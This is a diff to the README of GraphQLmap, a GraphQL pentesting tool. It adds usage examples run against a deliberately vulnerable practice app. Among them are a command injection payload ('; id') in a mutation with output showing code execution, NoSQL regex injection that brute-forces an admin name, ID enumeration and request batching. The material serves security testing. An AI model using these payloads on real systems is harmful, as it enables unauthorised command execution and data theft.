@@ -7,9 +7,11 @@
 * [Features and examples](#features-and-examples)
   - [Dump a GraphQL schema](#dump-a-graphql-schema)
   - [Interact with a GraphQL endpoint](#interact-with-a-graphql-endpoint)
-  - Execute GraphQL queries
-  - Autocomplete queries
+  - [Execute GraphQL queries](#)
+  - [Autocomplete queries](#)
   - [GraphQL field fuzzing](#graphql-field-fuzzing)
+    - [Example 1 - Bruteforce a character](#example-1---bruteforce-a-character)
+    - [Example 2 - Iterate over a number](#example-2---iterate-over-a-number)
   - [NoSQL injection inside a GraphQL field](#nosql-injection)
   - [SQL injection inside a GraphQL field](#sqli-injection)
 
@@ -21,7 +23,8 @@ You can also contribute with a :beers: IRL or using Github Sponsoring button.
 
 ```basic
 $ git clone https://github.com/swisskyrepo/GraphQLmap
-$ python graphqlmap.py                                                              
+$ python setup.py install
+$ graphqlmap                                                              
    _____                 _      ____  _                            
   / ____|               | |    / __ \| |                           
  | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __  
@@ -31,15 +34,26 @@ $ python graphqlmap.py
                   | |                                       | |    
                   |_|                                       |_|    
                                          Author:Swissky Version:1.0
-usage: graphqlmap.py [-h] [-u URL] [-v [VERBOSITY]] [--method [METHOD]] [--headers [HEADERS]]
+usage: graphqlmap.py [-h] [-u URL] [-v [VERBOSITY]] [--method [METHOD]] [--headers [HEADERS]] [--json [USE_JSON]] [--proxy [PROXY]]
 
 optional arguments:
-  -h, --help          show this help message and exit
-  -u URL              URL to query : example.com/graphql?query={}
-  -v [VERBOSITY]      Enable verbosity
-  --method [METHOD]   HTTP Method to use interact with /graphql endpoint
-  --headers [HEADERS] HTTP Headers sent to /graphql endpoint
-  --json              Send requests using POST and JSON
+  -h, --help           show this help message and exit
+  -u URL               URL to query : example.com/graphql?query={}
+  -v [VERBOSITY]       Enable verbosity
+  --method [METHOD]    HTTP Method to use interact with /graphql endpoint
+  --headers [HEADERS]  HTTP Headers sent to /graphql endpoint
+  --json [USE_JSON]    Use JSON encoding, implies POST
+  --proxy [PROXY]      HTTP proxy to log requests
+```
+
+Development setup
+
+```ps1
+python -m venv .venv
+source .venv/bin/activate
+pip install --editable .
+pip install -r requirements.txt
+./bin/graphqlmap -u http://127.0.0.1:5013/graphql
 ```
 
 
@@ -49,13 +63,17 @@ optional arguments:
 
 ### Connect to a graphql endpoint
 
-```
-python3 graphqlmap.py -u https://yourhostname.com/graphql -v --method POST --headers '{"Authorization" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0Ijoibm8gc2VjcmV0cyBoZXJlID1QIn0.JqqdOesC-R4LtOS9H0y7bIq-M8AGYjK92x4K3hcBA6o"}'
+```py
+# Connect using POST and providing an authentication token
+graphqlmap -u https://yourhostname.com/graphql -v --method POST --headers '{"Authorization" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0Ijoibm8gc2VjcmV0cyBoZXJlID1QIn0.JqqdOesC-R4LtOS9H0y7bIq-M8AGYjK92x4K3hcBA6o"}'
+
+# Pass request through Burp Proxy
+graphqlmap -u "http://172.17.0.1:5013/graphql" --proxy http://127.0.0.1:8080
 ```
 
 ### Dump a GraphQL schema
 
-Use `dump_new` to dump the GraphQL schema, this function will automaticly populate the "autocomplete" with the found fields.    
+Use `dump_new` to dump the GraphQL schema, this function will automatically populate the "autocomplete" with the found fields.    
 [:movie_camera: Live Example](https://asciinema.org/a/14YuWoDOyCztlx7RFykILit4S)
 
 ```powershell
@@ -102,10 +120,27 @@ GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin
 }
 ```
 
+It also works with `mutations`, they must be written in a single line.
+
+```ps1
+# ./bin/graphqlmap -u http://127.0.0.1:5013/graphql --proxy http://127.0.0.1:8080 --method POST
+GraphQLmap > mutation { importPaste(host:"localhost", port:80, path:"/ ; id", scheme:"http"){ result }}
+{
+    "data": {
+        "importPaste": {
+            "result": "uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"
+        {
+    {
+{
+```
+
+
 ### GraphQL field fuzzing
 
 Use `GRAPHQL_INCREMENT` and `GRAPHQL_CHARSET` to fuzz a parameter.      
 [:movie_camera: Live Example](https://asciinema.org/a/ICCz3PqHVNrBf262x6tQfuwqT)
+
+#### Example 1 - Bruteforce a character
 
 ```powershell
 GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}   
@@ -124,6 +159,53 @@ GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiG
 [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi1\"} }"){firstName lastName id}}     
 [+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi?\"} }"){firstName lastName id}}
 [+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
+```
+
+#### Example 2 - Iterate over a number
+
+Use `GRAPHQL_INCREMENT_` followed by a number.
+
+```powershell
+GraphQLmap > { paste(pId: "GRAPHQL_INCREMENT_10") {id,title,content,public,userAgent} }
+[+] Query: (45) { paste(pId: "0") {id,title,content,public,userAgent} }
+[+] Query: (245) { paste(pId: "1") {id,title,content,public,userAgent} }
+[+] Query: (371) { paste(pId: "2") {id,title,content,public,userAgent} }
+[+] Query: (309) { paste(pId: "3") {id,title,content,public,userAgent} }
+[+] Query: (311) { paste(pId: "4") {id,title,content,public,userAgent} }
+[+] Query: (308) { paste(pId: "5") {id,title,content,public,userAgent} }
+[+] Query: (375) { paste(pId: "6") {id,title,content,public,userAgent} }
+[+] Query: (315) { paste(pId: "7") {id,title,content,public,userAgent} }
+[+] Query: (336) { paste(pId: "8") {id,title,content,public,userAgent} }
+[+] Query: (377) { paste(pId: "9") {id,title,content,public,userAgent} }
+
+GraphQLmap > { paste(pId: "9") {id,title,content,public,userAgent} }
+{ paste(pId: "9") {id,title,content,public,userAgent} }
+{
+    "data": {
+        "paste": {
+            "content": "I was excited to spend time with my wife without being interrupted by kids.",
+            "id": "UGFzdGVPYmplY3Q6OQ==",
+            "public": true,
+            "title": "This is my first paste",
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
+        }
+    }
+}
+```
+
+### GraphQL Batching
+
+GraphQL supports Request Batching. Batched requests are processed one after the other by GraphQL
+Use `BATCHING_PLACEHOLDER` before a query to send it multiple times inside a single request.
+
+```ps1
+GraphQLmap > BATCHING_3 {__schema{ types{namea}}}
+[+] Sending a batch of 3 queries
+[+] Successfully received 3 outputs
+
+GraphQLmap > BATCHING_2 {systemUpdate}
+[+] Sending a batch of 2 queries
+[+] Successfully received 2 outputs
 ```
 
 ### NoSQLi injection
@@ -148,10 +230,14 @@ GraphQLmap > mysqli
 GraphQLmap > mssqli
 ```
 
+## Practice
+
+* [Damn Vulnerable GraphQL Application - @dolevf](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/blob/master/setup.py) : `docker run -t -p 5013:5013 -e WEB_HOST=0.0.0.0 dolevf/dvga`
 
 ## TODO
 
-* Docker with vulnerable GraphQL
+* GraphQL Field Suggestions
+* Generate mutation query
 * Unit tests
 * Handle node
 ```
